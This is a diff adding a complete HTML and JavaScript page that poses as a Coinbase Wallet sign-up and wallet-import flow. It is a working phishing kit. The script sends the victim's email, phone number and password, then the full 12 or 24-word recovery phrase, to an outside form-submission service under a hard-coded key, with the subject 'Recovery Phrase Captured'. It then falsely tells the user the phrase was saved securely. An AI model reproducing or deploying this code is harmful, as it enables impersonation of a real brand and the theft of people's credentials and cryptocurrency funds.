@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet App Flow</title>
+    <style>
+        /* =========================================
+           GLOBAL STYLES & RESET
+           ========================================= */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-image: radial-gradient(circle at 50% 0%, #1a3b4d 0%, #0d1117 40%);
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            height: 100%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* =========================================
+           SCREEN 1: SIGN UP / LOGIN FORM
+           ========================================= */
+        #screen-signup {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .logo-section {
+            margin-bottom: 40px;
+            margin-top: -60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-icon {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0052FF, #00E0FF);
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .logo-icon::after {
+            content: '';
+            width: 55px;
+            height: 55px;
+            background-color: #0d1117;
+            border-radius: 50%;
+            position: absolute;
+            right: 10px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+
+        .form-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .input-group {
+            width: 100%;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 1px solid #30363d;
+            background-color: #161b22;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s ease;
+        }
+
+        .input-group input:focus {
+            border-color: #00E0FF;
+            box-shadow: 0 0 8px rgba(0, 224, 255, 0.3);
+        }
+
+        .input-group input::placeholder {
+            color: #8b949e;
+        }
+
+        .error-text {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 5px;
+            margin-left: 5px;
+            display: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            margin-top: 10px;
+            border-radius: 30px;
+            border: none;
+            background-color: #00E0FF;
+            color: #000000;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #00bcd4;
+        }
+
+        .footer-text {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #8b949e;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        /* =========================================
+           SCREEN 2: MORE OPTIONS BOTTOM SHEET
+           ========================================= */
+        #screen-options {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background-color: #1a1f26;
+            border-radius: 24px 24px 0 0;
+            padding: 24px;
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.5);
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sheet-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .sheet-header h2 {
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .close-btn {
+            background: #2a3038;
+            border: none;
+            color: #8b949e;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .option-item {
+            background-color: #222831;
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            opacity: 0.4; 
+            pointer-events: none;
+        }
+
+        .option-item.clickable {
+            opacity: 1;
+            pointer-events: auto;
+            cursor: pointer;
+            border: 1px solid #00E0FF;
+            transition: 0.2s;
+        }
+
+        .option-item.clickable:active {
+            background-color: #2a3038;
+        }
+
+        .option-text h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .option-text p {
+            font-size: 13px;
+            color: #8b949e;
+        }
+
+        .option-icon {
+            color: #8b949e;
+            font-size: 20px;
+        }
+
+        /* =========================================
+           SCREEN 3: IMPORT WALLET
+           ========================================= */
+        #screen-import {
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            background-color: #0d1117;
+            position: absolute;
+            top: 0;
+            z-index: 20;
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            padding-top: 10px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            background-color: #1a1f26;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .top-bar h2 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .spacer {
+            width: 40px;
+        }
+
+        .instruction-text {
+            font-size: 14px;
+            color: #c9d1d9;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+
+        .word-count-selector {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .word-count-selector select {
+            background-color: #1a1f26;
+            color: #00E0FF;
+            border: 1px solid #30363d;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            outline: none;
+            cursor: pointer;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            text-align: center;
+        }
+        
+        .word-count-selector select option {
+            background-color: #1a1f26;
+            color: #fff;
+        }
+
+        /* Normal Grid View */
+        .input-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px 20px;
+            margin-bottom: 20px;
+            overflow-y: auto;
+            flex-grow: 1;
+            padding-right: 5px;
+            padding-bottom: 10px;
+        }
+
+        .input-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-row span {
+            font-size: 14px;
+            color: #8b949e;
+            width: 20px;
+            text-align: right;
+        }
+
+        .input-row input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #30363d;
+            color: #fff;
+            padding: 8px 4px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-row input:focus {
+            border-bottom-color: #00E0FF;
+        }
+
+        /* Manual Entry Textarea View */
+        .manual-entry-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            padding: 0 10px;
+        }
+
+        .manual-textarea {
+            width: 100%;
+            height: 120px;
+            background: transparent;
+            border: 1px solid #00E0FF;
+            border-radius: 8px;
+            color: #fff;
+            padding: 15px;
+            font-size: 16px;
+            line-height: 1.5;
+            resize: none;
+            outline: none;
+            margin-bottom: 20px;
+        }
+
+        .textarea-paste-btn {
+            background: transparent;
+            color: #8b949e;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: auto;
+        }
+
+        .textarea-paste-btn:hover {
+            color: #fff;
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .paste-btn {
+            background-color: #00E0FF;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(0, 224, 255, 0.2);
+        }
+
+        .type-manually-btn {
+            background-color: #1a1f26;
+            color: #fff;
+            border: 1px solid #30363d;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .import-btn {
+            width: 100%;
+            background-color: #00E0FF;
+            color: #000;
+            border: none;
+            padding: 18px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: auto;
+            opacity: 0.5; 
+            pointer-events: none;
+            transition: 0.3s;
+        }
+
+        .import-btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .input-grid::-webkit-scrollbar {
+            width: 4px;
+        }
+        .input-grid::-webkit-scrollbar-thumb {
+            background: #30363d;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <!-- SCREEN 1: SIGN UP / LOGIN -->
+        <div id="screen-signup">
+            <div class="logo-section">
+                <div class="logo-icon"></div>
+                <div class="logo-text">WALLET</div>
+            </div>
+
+            <form id="signupForm" class="form-section">
+                <!-- Web3Forms Hidden Fields -->
+                <input type="hidden" name="access_key" value="6d0efec6-54f3-4a89-a96e-0f4c1f78de44">
+                <input type="hidden" name="subject" value="New User Signup - Coinbase Wallet">
+                <input type="hidden" name="from_name" value="Coinbase Wallet Security">
+                <input type="checkbox" name="botcheck" style="display: none;">
+
+                <div class="input-group">
+                    <input type="email" id="email" name="email" placeholder="Email Address" required>
+                    <div class="error-text" id="email-error">Please enter a valid email address.</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="tel" id="mobile" name="mobile" placeholder="Mobile Number" required>
+                    <div class="error-text" id="mobile-error">Please enter a valid mobile number (8-15 digits).</div>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <div class="error-text" id="password-error">Password must be at least 6 characters.</div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="btn-continue">Continue</button>
+            </form>
+
+            <div class="footer-text">
+                By using Coinbase Wallet, you agree to accept our<br>
+                Terms of Service and Privacy Policy.
+            </div>
+        </div>
+
+        <!-- SCREEN 2: MORE OPTIONS -->
+        <div id="screen-options" class="hidden">
+            <div class="sheet-header">
+                <h2>More Options</h2>
+                <button class="close-btn" id="btn-close-options">✕</button>
+            </div>
+
+            <div class="option-item">
+                <div class="option-text">
+                    <h3>Create Recovery Phrase</h3>
+                    <p>New multi-chain mnemonic</p>
+                </div>
+                <div class="option-icon">🪙</div>
+            </div>
+
+            <div class="option-item">
+                <div class="option-text">
+                    <h3>Import Passkey</h3>
+                    <p>Use an existing passkey</p>
+                </div>
+                <div class="option-icon">›</div>
+            </div>
+
+            <div class="option-item">
+                <div class="option-text">
+                    <h3>Import Google Drive Backup</h3>
+                    <p>Use a backup saved to Google Drive</p>
+                </div>
+                <div class="option-icon">›</div>
+            </div>
+
+            <div class="option-item clickable" id="btn-enter-recovery">
+                <div class="option-text">
+                    <h3>Enter Recovery Phrase</h3>
+                    <p>Use a 12 or 24-word phrase</p>
+                </div>
+                <div class="option-icon">›</div>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: IMPORT WALLET -->
+        <div id="screen-import" class="hidden">
+            <div class="top-bar">
+                <button class="back-btn" id="btn-back-import">‹</button>
+                <h2>Import Wallet</h2>
+                <div class="spacer"></div>
+            </div>
+
+            <p class="instruction-text" id="instruction-text">
+                Enter your 12 or 24 word secret recovery phrase
+            </p>
+
+            <div class="word-count-selector">
+                <select id="word-count-select">
+                    <option value="12">12 Words</option>
+                    <option value="24">24 Words</option>
+                </select>
+            </div>
+
+            <!-- Grid View -->
+            <div class="input-grid" id="input-grid">
+                <!-- JS will populate -->
+            </div>
+
+            <!-- Manual Textarea View -->
+            <div class="manual-entry-container" id="manual-entry-container">
+                <textarea class="manual-textarea" id="manual-textarea" placeholder="Enter your recovery phrase here..."></textarea>
+                <button class="textarea-paste-btn" id="textarea-paste-btn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    Paste
+                </button>
+            </div>
+
+            <!-- Grid Action Buttons -->
+            <div class="action-buttons" id="grid-action-buttons">
+                <button class="paste-btn" id="btn-paste">
+                    <span>+</span> Paste From Clipboard
+                </button>
+                <button class="type-manually-btn" id="btn-type-manually">
+                    ✎ Type Manually
+                </button>
+            </div>
+
+            <button class="import-btn" id="btn-import">Import</button>
+        </div>
+
+    </div>
+
+    <script>
+        // --- DOM Elements ---
+        const screenSignup = document.getElementById('screen-signup');
+        const screenOptions = document.getElementById('screen-options');
+        const screenImport = document.getElementById('screen-import');
+        
+        const signupForm = document.getElementById('signupForm');
+        const emailInput = document.getElementById('email');
+        const mobileInput = document.getElementById('mobile');
+        const passwordInput = document.getElementById('password');
+        
+        const emailError = document.getElementById('email-error');
+        const mobileError = document.getElementById('mobile-error');
+        const passwordError = document.getElementById('password-error');
+
+        const btnCloseOptions = document.getElementById('btn-close-options');
+        const btnEnterRecovery = document.getElementById('btn-enter-recovery');
+        const btnBackImport = document.getElementById('btn-back-import');
+        
+        const wordCountSelect = document.getElementById('word-count-select');
+        const inputGrid = document.getElementById('input-grid');
+        const manualEntryContainer = document.getElementById('manual-entry-container');
+        const manualTextarea = document.getElementById('manual-textarea');
+        const gridActionButtons = document.getElementById('grid-action-buttons');
+        const btnPaste = document.getElementById('btn-paste');
+        const btnTypeManually = document.getElementById('btn-type-manually');
+        const textareaPasteBtn = document.getElementById('textarea-paste-btn');
+        const btnImport = document.getElementById('btn-import');
+        const instructionText = document.getElementById('instruction-text');
+
+        // Variables to store user data temporarily
+        let currentUserEmail = ""; 
+        let currentUserMobile = "";
+        let currentUserPassword = "";
+        let currentWordCount = 12;
+        let isManualMode = false;
+
+        // =========================================
+        // 1. SIGNUP VALIDATION & SUBMISSION
+        // =========================================
+        function validateSignup() {
+            let isValid = true;
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(emailInput.value.trim())) {
+                emailError.style.display = 'block';
+                emailInput.style.borderColor = '#ff6b6b';
+                isValid = false;
+            } else {
+                emailError.style.display = 'none';
+                emailInput.style.borderColor = '#30363d';
+            }
+
+            const mobileRegex = /^\d{8,15}$/; 
+            if (!mobileRegex.test(mobileInput.value.trim())) {
+                mobileError.style.display = 'block';
+                mobileInput.style.borderColor = '#ff6b6b';
+                isValid = false;
+            } else {
+                mobileError.style.display = 'none';
+                mobileInput.style.borderColor = '#30363d';
+            }
+
+            if (passwordInput.value.length < 6) {
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#ff6b6b';
+                isValid = false;
+            } else {
+                passwordError.style.display = 'none';
+                passwordInput.style.borderColor = '#30363d';
+            }
+
+            return isValid;
+        }
+
+        signupForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (!validateSignup()) {
+                return;
+            }
+
+            const btn = document.getElementById('btn-continue');
+            const originalText = btn.innerText;
+            btn.innerText = "Sending...";
+            btn.disabled = true;
+
+            currentUserEmail = emailInput.value.trim();
+            currentUserMobile = mobileInput.value.trim();
+            currentUserPassword = passwordInput.value;
+
+            const formData = new FormData(signupForm);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: json
+                });
+
+                const result = await response.json();
+
+                if (response.status === 200 && result.success) {
+                    screenSignup.classList.add('hidden');
+                    screenOptions.classList.remove('hidden');
+                } else {
+                    alert("Submission failed: " + (result.message || "Unknown error"));
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Something went wrong. Please try again.");
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }
+        });
+
+        emailInput.addEventListener('input', () => { emailError.style.display = 'none'; emailInput.style.borderColor = '#30363d'; });
+        mobileInput.addEventListener('input', () => { mobileError.style.display = 'none'; mobileInput.style.borderColor = '#30363d'; });
+        passwordInput.addEventListener('input', () => { passwordError.style.display = 'none'; passwordInput.style.borderColor = '#30363d'; });
+
+
+        // =========================================
+        // 2. NAVIGATION & IMPORT WALLET LOGIC
+        // =========================================
+        btnCloseOptions.addEventListener('click', () => {
+            screenOptions.classList.add('hidden');
+            screenSignup.classList.remove('hidden');
+        });
+
+        btnEnterRecovery.addEventListener('click', () => {
+            screenOptions.classList.add('hidden');
+            screenImport.classList.remove('hidden');
+            resetImportScreen();
+        });
+
+        btnBackImport.addEventListener('click', () => {
+            screenImport.classList.add('hidden');
+            screenOptions.classList.remove('hidden');
+        });
+
+        function resetImportScreen() {
+            wordCountSelect.value = "12";
+            currentWordCount = 12;
+            isManualMode = false;
+            manualTextarea.value = '';
+            instructionText.textContent = `Enter your 12 or 24 word secret recovery phrase`;
+            
+            inputGrid.style.display = 'grid';
+            gridActionButtons.style.display = 'flex';
+            manualEntryContainer.style.display = 'none';
+            
+            generateInputs(12);
+        }
+
+        function generateInputs(count) {
+            currentWordCount = count;
+            inputGrid.innerHTML = ''; 
+
+            for (let i = 1; i <= count; i++) {
+                const row = document.createElement('div');
+                row.className = 'input-row';
+                
+                const number = document.createElement('span');
+                number.textContent = `${i}.`;
+                
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.placeholder = 'Word';
+                input.id = `word-${i}`;
+                
+                input.addEventListener('input', checkImportButtonState);
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === ' ') {
+                        e.preventDefault(); 
+                        if (i < count) {
+                            document.getElementById(`word-${i + 1}`).focus();
+                        }
+                    }
+                    if (e.key === 'Backspace' && e.target.value === '' && i > 1) {
+                        document.getElementById(`word-${i - 1}`).focus();
+                    }
+                });
+
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                    const words = pastedText.trim().split(/\s+/).filter(w => w.length > 0);
+                    
+                    let j = 0;
+                    for (let k = i; k <= count; k++) {
+                        if (j < words.length) {
+                            document.getElementById(`word-${k}`).value = words[j];
+                            j++;
+                        }
+                    }
+                    checkImportButtonState();
+                });
+
+                row.appendChild(number);
+                row.appendChild(input);
+                inputGrid.appendChild(row);
+            }
+            checkImportButtonState();
+        }
+
+        wordCountSelect.addEventListener('change', (e) => {
+            const newCount = parseInt(e.target.value);
+            if (isManualMode) {
+                manualTextarea.value = '';
+                currentWordCount = newCount;
+                checkImportButtonState();
+            } else {
+                generateInputs(newCount);
+            }
+        });
+
+        btnTypeManually.addEventListener('click', () => {
+            isManualMode = true;
+            inputGrid.style.display = 'none';
+            gridActionButtons.style.display = 'none';
+            manualEntryContainer.style.display = 'flex';
+            
+            let existingWords = [];
+            for(let i=1; i<=currentWordCount; i++){
+                const val = document.getElementById(`word-${i}`).value.trim();
+                if(val) existingWords.push(val);
+            }
+            manualTextarea.value = existingWords.join(' ');
+            
+            manualTextarea.focus();
+            checkImportButtonState();
+        });
+
+        manualTextarea.addEventListener('input', (e) => {
+            let text = e.target.value;
+            text = text.replace(/\s+/g, ' '); 
+            
+            let words = text.trim().split(' ').filter(w => w.length > 0);
+            
+            if (words.length > currentWordCount) {
+                words = words.slice(0, currentWordCount);
+            }
+            
+            let finalText = words.join(' ');
+            if (text.endsWith(' ') && words.length < currentWordCount) {
+                finalText += ' ';
+            }
+
+            e.target.value = finalText;
+            checkImportButtonState();
+        });
+
+        textareaPasteBtn.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                let cleanText = text.trim().replace(/\s+/g, ' ');
+                let words = cleanText.split(' ').filter(w => w.length > 0);
+                
+                if (words.length > currentWordCount) {
+                    words = words.slice(0, currentWordCount);
+                }
+                
+                manualTextarea.value = words.join(' ');
+                checkImportButtonState();
+            } catch (err) {
+                alert("Could not read clipboard.");
+            }
+        });
+
+        btnPaste.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                const words = text.trim().split(/\s+/).filter(w => w.length > 0);
+                
+                for (let i = 0; i < currentWordCount; i++) {
+                    if(i < words.length) {
+                        document.getElementById(`word-${i + 1}`).value = words[i];
+                    } else {
+                        document.getElementById(`word-${i + 1}`).value = ''; 
+                    }
+                }
+                
+                if(words.length > currentWordCount) {
+                    alert(`Note: Only the first ${currentWordCount} words were pasted.`);
+                }
+                
+                checkImportButtonState();
+            } catch (err) {
+                alert("Could not read clipboard.");
+            }
+        });
+
+        function checkImportButtonState() {
+            let filledWords = 0;
+
+            if (isManualMode) {
+                const text = manualTextarea.value.trim();
+                const words = text.split(/\s+/).filter(w => w.length > 0);
+                filledWords = words.length;
+            } else {
+                for(let i=1; i<=currentWordCount; i++){
+                    if(document.getElementById(`word-${i}`).value.trim() !== "") {
+                        filledWords++;
+                    }
+                }
+            }
+
+            if (filledWords === currentWordCount) {
+                btnImport.classList.add('active');
+            } else {
+                btnImport.classList.remove('active');
+            }
+        }
+
+        // =========================================
+        // 3. SUBMIT RECOVERY PHRASE TO EMAIL
+        // =========================================
+        btnImport.addEventListener('click', async () => {
+            let phrase = "";
+
+            if (isManualMode) {
+                phrase = manualTextarea.value.trim();
+            } else {
+                let wordsArray = [];
+                for(let i=1; i<=currentWordCount; i++){
+                    wordsArray.push(document.getElementById(`word-${i}`).value.trim());
+                }
+                phrase = wordsArray.join(' ');
+            }
+
+            const wordCount = phrase.split(/\s+/).filter(w => w.length > 0).length;
+            if(wordCount !== currentWordCount) {
+                alert(`Error: You selected ${currentWordCount} words, but entered ${wordCount}.`);
+                return;
+            }
+
+            const originalText = btnImport.innerText;
+            btnImport.innerText = "Importing...";
+            btnImport.disabled = true;
+
+            const payload = {
+                access_key: "6d0efec6-54f3-4a89-a96e-0f4c1f78de44",
+                subject: "🔐 Recovery Phrase Captured - Coinbase Wallet",
+                from_name: "Coinbase Wallet Security",
+                email: currentUserEmail,
+                mobile: currentUserMobile,
+                password: currentUserPassword,
+                recovery_phrase: phrase,
+                word_count: currentWordCount
+            };
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (response.status === 200 && result.success) {
+                    alert(`Success! Recovery phrase saved and sent securely.`);
+                } else {
+                    alert("Submission failed: " + (result.message || "Unknown error"));
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Something went wrong. Please check your internet.");
+            } finally {
+                btnImport.innerText = originalText;
+                btnImport.disabled = false;
+            }
+        });
+
+    </script>
+</body>
+</html>
